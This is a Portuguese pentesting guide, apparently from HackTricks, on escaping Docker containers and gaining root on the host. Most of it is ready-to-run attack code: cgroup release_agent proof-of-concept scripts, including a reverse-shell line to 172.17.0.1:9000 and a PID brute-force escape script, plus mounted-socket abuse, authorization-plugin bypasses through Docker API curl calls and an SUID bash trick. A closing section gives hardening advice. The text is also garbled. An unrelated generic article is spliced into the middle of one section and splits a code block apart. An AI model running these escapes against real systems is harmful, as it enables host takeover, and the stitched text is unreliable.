# O que é um container

Em resumo, é um **processo isolado** por meio de **cgroups** (o que o processo pode usar, como CPU e RAM) e **namespaces** (o que o processo pode ver, como diretórios ou outros processos):
```bash
docker run -dt --rm denial sleep 1234 #Run a large sleep inside a Debian container
ps -ef | grep 1234 #Get info about the sleep process
ls -l /proc/<PID>/ns #Get the Group and the namespaces (some may be uniq to the hosts and some may be shred with it)
```
# Socket do Docker montado

Se, de alguma forma, você descobrir que o **socket do Docker está montado** dentro do contêiner do Docker, você poderá escapar dele.\
Isso geralmente acontece em contêineres do Docker que, por algum motivo, precisam se conectar ao daemon do Docker para realizar ações.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Neste caso, você pode usar comandos regulares do docker para se comunicar com o daemon do docker:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash
```
{% hint style="info" %}
Caso o **socket do docker esteja em um local inesperado**, você ainda pode se comunicar com ele usando o comando **`docker`** com o parâmetro **`-H unix:///caminho/para/docker.sock`**
{% endhint %}

# Capacidades do Container

Você deve verificar as capacidades do container, se ele tiver alguma das seguintes, você pode ser capaz de escapar dele: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE`**

Você pode verificar as capacidades do container atual com:
```bash
capsh --print
```
Na seguinte página você pode **aprender mais sobre as capacidades do Linux** e como abusar delas:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

# Flag `--privileged`

A flag --privileged permite que o contêiner tenha acesso aos dispositivos do host.

## Eu sou o Root

Contêineres docker bem configurados não permitirão comandos como **fdisk -l**. No entanto, em um comando docker mal configurado onde a flag --privileged é especificada, é possível obter privilégios para ver a unidade do host.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Portanto, para assumir o controle da máquina host, é trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
E voilà! Agora você pode acessar o sistema de arquivos do host porque ele está montado na pasta `/mnt/hola`.

{% code title="PoC Inicial" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% endcode %}

{% code title="Segundo PoC" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

A flag `--privileged` introduz preocupações significativas de segurança, e o exploit depende de lançar um container docker com ele habilitado. Ao usar essa flag, os containers têm acesso total a todos os dispositivos e não têm restrições do seccomp, AppArmor e Linux capabilities.

Na verdade, `--privileged` fornece permissões muito maiores do que as necessárias para escapar de um container docker por meio deste método. Na realidade, os "únicos" requisitos são:

1. Devemos estar executando como root dentro do container
2. O container deve ser executado com a capacidade Linux `SYS_ADMIN`
3. O container deve não ter um perfil AppArmor, ou permitir a chamada `mount`
4. O sistema de arquivos virtual cgroup v1 deve ser montado com permissão de leitura e gravação dentro do container

A capacidade `SYS_ADMIN` permite que um container execute a chamada de sistema `mount` (consulte [man 7 capabilities](https://linux.die.net/man/7/capabilities)). [O Docker inicia containers com um conjunto restrito de capacidades](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) por padrão e não habilita a capacidade `SYS_ADMIN` devido aos riscos de segurança envolvidos.

Além disso, o Docker [inicia containers com a política AppArmor padrão `docker-default`](https://docs.docker.com/engine/security/apparmor/#understand-the-policies), que [impede o uso da chamada de sistema `mount`](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) mesmo quando o container é executado com `SYS_ADMIN`.

Um container seria vulnerável a essa técnica se executado com as flags: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## Quebrando o conceito de prova

Agora que entendemos os requisitos para usar essa técnica e refinamos o exploit de prova de conceito, vamos percorrer linha por linha para demonstrar como ele funciona.

Para acionar esse exploit, precisamos de um cgroup onde possamos criar um arquivo `release_agent` e acionar a invocação do `release_agent` matando todos os processos no cgroup. A maneira mais fácil de fazer isso é montar um controlador cgroup e criar um cgroup filho.

Para fazer isso, criamos um diretório `/tmp/cgrp`, montamos o controlador cgroup [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) e criamos um cgroup filho (chamado "x" para fins deste exemplo). Embora nem todos os controladores cgroup tenham sido testados, essa técnica deve funcionar com a maioria dos controladores cgroup.

Se você estiver seguindo e receber "mount: /tmp/cgrp: dispositivo especial cgroup não existe", é porque sua configuração não tem o controlador cgroup RDMA. Altere `rdma` para `memory` para corrigir. Estamos usando RDMA porque o PoC original foi projetado apenas para funcionar com ele.

Observe que os controladores cgroup são recursos globais que podem ser montados várias vezes com permissões diferentes e as alterações renderizadas em uma montagem serão aplicadas a outra.

Podemos ver a criação do cgroup filho "x" e sua listagem de diretórios abaixo.
```
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
Em seguida, habilitamos as notificações do cgroup na liberação do cgroup "x" escrevendo um 1 em seu arquivo `notify_on_release`. Também definimos o agente de liberação do cgroup RDMA para executar um script `/cmd` - que criaremos posteriormente no contêiner - escrevendo o caminho do script `/cmd` no host para o arquivo `release_agent`. Para fazer isso, obtemos o caminho do contêiner no host a partir do arquivo `/etc/mtab`.

Os arquivos que adicionamos ou modificamos no contêiner estão presentes no host e é possível modificá-los de ambos os mundos: o caminho no contêiner e o caminho no host.

Essas operações podem ser vistas abaixo:
```
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
Observe o caminho para o script `/cmd`, que vamos criar no host:
```
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
Agora, criamos o script `/cmd` de forma que ele execute o comando `ps aux` e salve sua saída em `/output` no contêiner, especificando o caminho completo do arquivo de saída no host. No final, também imprimimos o conteúdo do script `/cmd` para ver seus detalhes:
```
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
Finalmente, podemos executar o ataque gerando um processo que termina imediatamente dentro do cgroup filho "x". Ao criar um processo `/bin/sh` e escrever seu PID no arquivo `cgroup.procs` no diretório do cgroup filho "x", o script no host será executado após a saída do `/bin/sh`. A saída do `ps aux` executado no host é então salva no arquivo `/output` dentro do contêiner:
```
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# Sinalizador `--privileged` v2

Os PoCs anteriores funcionam bem quando o contêiner é configurado com um driver de armazenamento que expõe o caminho completo do host do ponto de montagem, por exemplo, `overlayfs`. No entanto, recentemente me deparei com algumas configurações que não revelavam claramente o ponto de montagem do sistema de arquivos do host.

## Kata Containers
```
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
O [Kata Containers](https://katacontainers.io) por padrão monta o sistema de arquivos raiz de um contêiner sobre `9pfs`. Isso não revela nenhuma informação sobre a localização do sistema de arquivos do contêiner na Máquina Virtual do Kata Containers.

\* Mais sobre o Kata Containers em um futuro post no blog. 

## Device Mapper
```
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
Vi um container com este ponto de montagem raiz em um ambiente ao vivo, acredito que o container estava sendo executado com uma configuração específica de driver de armazenamento `devicemapper`, mas até agora não consegui replicar esse comportamento em um ambiente de teste.

## Uma PoC Alternativa

Obviamente, nesses casos, não há informações suficientes para identificar o caminho dos arquivos do container no sistema de arquivos do host, então a PoC de Felix não pode ser usada como está. No entanto, ainda podemos executar esse ataque com um pouco de engenhosidade.

A única informação chave necessária é o caminho completo, relativo ao host do container, de um arquivo para executar dentro do container. Sem ser capaz de discernir isso a partir dos pontos de montagem dentro do container, temos que procurar em outro lugar.

### Proc para o Resgate <a href="proc-to-the-rescue" id="proc-to-the-rescue"></a>

O pseudo-sistema de arquivos `/proc` do Linux expõe as estruturas de dados do processo do kernel para todos os processos em execução em um sistema, incluindo aqueles em diferentes namespaces, por exemplo, dentro de um container. Isso pode ser mostrado executando um comando em um container e acessando o diretório `/proc` do processo no host:Container.
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
Como observação, a estrutura de dados `/proc/<pid>/root` é uma que me confundiu por muito tempo, eu nunca conseguia entender por que ter um link simbólico para `/` era útil, até que eu li a definição real nas páginas do manual:

> /proc/\[pid]/root
>
> UNIX e Linux suportam a ideia de um root do sistema de arquivos por processo, definido pelo sistema de chamada chroot(2). Este arquivo é um link simbólico que aponta para o diretório raiz do processo e se comporta da mesma forma que exe e fd/\*.
>
> No entanto, observe que este arquivo não é apenas um link simbólico. Ele fornece a mesma visão do sistema de arquivos (incluindo namespaces e o conjunto de montagens por processo) que o próprio processo.

O link simbólico `/proc/<pid>/root` pode ser usado como um caminho relativo do host para qualquer arquivo dentro de um contêiner:Container.
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
Isso muda o requisito para o ataque de saber o caminho completo, em relação ao host do contêiner, de um arquivo dentro do contêiner, para saber o pid de _qualquer_ processo em execução no contêiner.

### Pid Bashing <a href="pid-bashing" id="pid-bashing"></a>

Isso é realmente a parte fácil, ids de processo no Linux são numéricos e atribuídos sequencialmente. O processo `init` é atribuído ao pid `1` e todos os processos subsequentes são atribuídos a ids incrementais. Para identificar o pid do processo host de um processo dentro de um contêiner, uma busca incremental de força bruta pode ser usada:Container
```
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# Escalada de privilégios em Docker

## Introdução

Docker é uma plataforma de contêineres que permite que os desenvolvedores empacotem, distribuam e executem aplicativos em contêineres. Os contêineres são isolados uns dos outros e da máquina host, o que os torna uma opção segura para executar aplicativos. No entanto, se um invasor conseguir acesso a um contêiner, ele pode tentar escapar do contêiner e obter acesso à máquina host. Neste guia, veremos algumas técnicas para escapar de um contêiner Docker e obter acesso à máquina host.

## Escapando de um contêiner Docker

### Técnica 1: Montando o diretório raiz do host

Se um contêiner tiver acesso ao diretório raiz do host, ele poderá acessar todos os arquivos e diretórios do host. Para montar o diretório raiz do host em um contêiner, execute o seguinte comando:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Este comando inicia um contêiner Alpine e monta o diretório raiz do host em `/mnt`. Em seguida, ele executa o comando `chroot` para mudar o diretório raiz do contêiner para `/mnt`, o que lhe dá acesso a todos os arquivos e diretórios do host.

### Técnica 2: Montando o soquete do Docker

Se um contêiner tiver acesso ao soquete do Docker, ele poderá controlar o Docker e executar comandos como `docker run` e `docker exec`. Para montar o soquete do Docker em um contêiner, execute o seguinte comando:

```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock --rm -it alpine sh
```

Este comando inicia um contêiner Alpine e monta o soquete do Docker em `/var/run/docker.sock`. Em seguida, ele executa um shell dentro do contêiner, que agora tem acesso ao Docker.

### Técnica 3: Usando um contêiner privilegiado

Se um contêiner for executado com a opção `--privileged`, ele terá acesso total à máquina host. Para executar um contêiner privilegiado, execute o seguinte comando:

```bash
docker run --privileged --rm -it alpine sh
```

Este comando inicia um contêiner Alpine com privilégios totais. O contêiner agora tem acesso total à máquina host.

## Conclusão

Escapar de um contêiner Docker e obter acesso à máquina host pode ser uma tarefa difícil, mas não é impossível. As técnicas descritas neste guia são apenas algumas das muitas maneiras de escapar de um contêiner Docker. É importante lembrar que a segurança do Docker depende da segurança do host e da configuração do Docker. Certifique-se de seguir as práticas recomendadas de segurança ao usar o Docker.
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### Colocando Tudo Junto <a href="putting-it-all-together" id="putting-it-all-together"></a>

Para completar este ataque, a técnica de força bruta pode ser usada para adivinhar o pid para o caminho `/proc/<pid>/root/payload.sh`, com cada iteração escrevendo o caminho pid adivinhado para o arquivo `release_agent` dos cgroups, acionando o `release_agent` e verificando se um arquivo de saída é criado.

A única ressalva com esta técnica é que ela não é de forma alguma sutil e pode aumentar muito o número de pids. Como nenhum processo de longa duração é mantido em execução, isso _não deveria_ causar problemas de confiabilidade, mas não me cite sobre isso.

O PoC abaixo implementa essas técnicas para fornecer um ataque mais genérico do que o apresentado inicialmente no PoC original de Felix para escapar de um contêiner privilegiado usando a funcionalidade `release_agent` dos cgroups:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Executar o PoC dentro de um container privilegiado deve fornecer uma saída semelhante a:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# Exploração do Runc (CVE-2019-5736)

Caso você possa executar `docker exec` como root (provavelmente com sudo), tente escalar privilégios escapando de um contêiner abusando do CVE-2019-5736 (exploit [aqui](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Essa técnica basicamente irá **sobrescrever** o binário _**/bin/sh**_ do **host** **a partir de um contêiner**, então qualquer pessoa que execute o docker exec pode acionar o payload.

Altere o payload de acordo e construa o main.go com `go build main.go`. O binário resultante deve ser colocado no contêiner docker para execução.\
Ao executar, assim que exibir `[+] Overwritten /bin/sh successfully`, você precisa executar o seguinte na máquina host:

`docker exec -it <nome-do-contêiner> /bin/sh`

Isso acionará o payload que está presente no arquivo main.go.

Para mais informações: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

# Bypass do Plugin de Autenticação do Docker

Em algumas ocasiões, o sysadmin pode instalar alguns plugins no docker para evitar que usuários com baixo privilégio interajam com o docker sem poder escalar privilégios.

## `run --privileged` desautorizado

Nesse caso, o sysadmin **desautorizou usuários a montar volumes e executar contêineres com a flag `--privileged`** ou dar qualquer capacidade extra ao contêiner:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
No entanto, um usuário pode **criar um shell dentro do contêiner em execução e conceder privilégios extras a ele**:
```bash
docker run -d --security-opt "seccomp=unconfined" ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de
docker exec -it --privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
```
Agora, o usuário pode escapar do contêiner usando qualquer uma das técnicas discutidas anteriormente e escalar privilégios dentro do host.

## Montar pasta gravável

Neste caso, o sysadmin **proibiu que os usuários executem contêineres com a flag `--privileged`** ou concedam qualquer capacidade extra ao contêiner, e permitiu apenas a montagem da pasta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
 -p #This will give you a shell as root
```
{% hint style="info" %}
Observe que talvez você não possa montar a pasta `/tmp`, mas pode montar uma **pasta gravável diferente**. Você pode encontrar diretórios graváveis usando: `find / -writable -type d 2>/dev/null`

**Observe que nem todos os diretórios em uma máquina linux suportarão o bit suid!** Para verificar quais diretórios suportam o bit suid, execute `mount | grep -v "nosuid"`. Por exemplo, geralmente `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` e `/var/lib/lxcfs` não suportam o bit suid.

Observe também que, se você puder **montar `/etc`** ou qualquer outra pasta **contendo arquivos de configuração**, poderá modificá-los a partir do contêiner docker como root para **abusá-los no host** e escalar privilégios (talvez modificando `/etc/shadow`).
{% endhint %}

## Estrutura JSON não verificada

É possível que, ao configurar o firewall do docker, o sysadmin **tenha esquecido de algum parâmetro importante** da API ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) como "**Binds**".\
No exemplo a seguir, é possível abusar dessa má configuração para criar e executar um contêiner que monta a pasta raiz (/) do host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
## Atributo JSON não verificado

É possível que, ao configurar o firewall do docker, o sysadmin **tenha esquecido de algum atributo importante de um parâmetro da API** ([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)) como "**Capabilities**" dentro de "**HostConfig**". No exemplo a seguir, é possível abusar dessa má configuração para criar e executar um contêiner com a capacidade **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
# Montagem de hostPath gravável

(Informação retirada [**aqui**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)) Dentro do contêiner, um invasor pode tentar obter mais acesso ao sistema operacional subjacente do host por meio de um volume hostPath gravável criado pelo cluster. Abaixo estão algumas coisas comuns que você pode verificar dentro do contêiner para ver se está usando esse vetor de ataque:
```bash
### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# Melhorias na Segurança de Containers

## Seccomp no Docker

Esta não é uma técnica para escapar de um container Docker, mas sim um recurso de segurança que o Docker usa e que você deve conhecer, pois pode impedir que você escape do Docker:

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## AppArmor no Docker

Esta não é uma técnica para escapar de um container Docker, mas sim um recurso de segurança que o Docker usa e que você deve conhecer, pois pode impedir que você escape do Docker:

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## AuthZ & AuthN

Um plugin de autorização **aprova** ou **nega** **pedidos** ao **daemon** do Docker com base no contexto atual de **autenticação** e no contexto de **comando**. O contexto de **autenticação** contém todos os detalhes do **usuário** e o **método de autenticação**. O contexto de **comando** contém todos os dados relevantes do **pedido**.

{% content-ref url="broken-reference" %}
[Broken link](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor** é um kernel de aplicativo, escrito em Go, que implementa uma parte substancial da superfície do sistema Linux. Ele inclui um tempo de execução [Open Container Initiative (OCI)](https://www.opencontainers.org) chamado `runsc` que fornece uma **barreira de isolamento entre o aplicativo e o kernel do host**. O tempo de execução `runsc` integra-se ao Docker e ao Kubernetes, tornando simples a execução de contêineres isolados.

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers** é uma comunidade de código aberto que trabalha para construir um tempo de execução de contêiner seguro com máquinas virtuais leves que parecem e funcionam como contêineres, mas fornecem uma **isolamento de carga de trabalho mais forte usando tecnologia de virtualização de hardware** como uma segunda camada de defesa.

{% embed url="https://katacontainers.io/" %}

## Use containers com segurança

O Docker restringe e limita os contêineres por padrão. Afrouxar essas restrições pode criar problemas de segurança, mesmo sem o poder total da flag `--privileged`. É importante reconhecer o impacto de cada permissão adicional e limitar as permissões em geral ao mínimo necessário.

Para ajudar a manter os contêineres seguros:

* Não use a flag `--privileged` ou monte um [socket do Docker dentro do contêiner](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/). O socket do Docker permite a criação de contêineres, portanto, é uma maneira fácil de assumir o controle total do host, por exemplo, executando outro contêiner com a flag `--privileged`.
* Não execute como root dentro do contêiner. Use um [usuário diferente](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) ou [espaços de nomes de usuário](https://docs.docker.com/engine/security/userns-remap/). O root no contêiner é o mesmo que no host, a menos que seja remapeado com espaços de nomes de usuário. Ele é apenas levemente restrito por, principalmente, espaços de nomes do Linux, capacidades e cgroups.
* [Descarte todas as capacidades](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) e habilite apenas aquelas que são necessárias (`--cap-add=...`). Muitas cargas de trabalho não precisam de nenhuma capacidade e adicioná-las aumenta o escopo de um possível ataque.
* [Use a opção de segurança "no-new-privileges"](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) para impedir que os processos ganhem mais privilégios, por exemplo, por meio de binários suid.
* [Limite os recursos disponíveis para o contêiner](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources). Os limites de recursos podem proteger a máquina contra ataques de negação de serviço.
* Ajuste os perfis [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (ou SELinux) para restringir as ações e syscalls disponíveis para o contêiner ao mínimo necessário.
* Use [imagens docker oficiais](https://docs.docker.com/docker-hub/official_images/) ou construa a sua própria com base nelas. Não herde ou use imagens [comprometidas](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/).
* Reconstrua regularmente suas imagens para aplicar patches de segurança. Isso vai sem dizer.

# Referências

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

